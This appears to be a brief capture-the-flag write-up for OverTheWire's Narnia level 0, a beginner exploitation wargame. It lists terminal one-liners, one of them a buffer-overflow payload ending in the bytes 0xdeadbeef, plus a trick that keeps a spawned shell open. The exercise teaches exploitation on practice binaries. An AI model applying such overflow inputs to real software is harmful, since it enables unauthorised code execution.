**>> Details: [https://overthewire.org/wargames/narnia/](https://overthewire.org/wargames/narnia/)**

> This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.

![grafik](https://user-images.githubusercontent.com/84674087/142839640-d5296859-5d88-4d7e-8d83-a703d855b394.png)


## Narnia 0

![grafik](https://user-images.githubusercontent.com/84674087/142839936-9a2f374f-9862-45a3-831b-77ca618ca65a.png)

#### Solution

- Run a one-liner in the terminal, used as input for your script
   - Option 1): ``` ./script `python3 -c "print('A' * 5)"` ```
   - Option 2): `python -c "print('hallo')" | ./script`
   - Option 3): `python -c "print('B'*20 + '\xef\xbe\xad\xde')" | ./narnia0`
   - Option 4): `(python -c "command1" ; command2 ; cat) | ./narnia0`  --> "cat" keeps shell open (!)

<br />

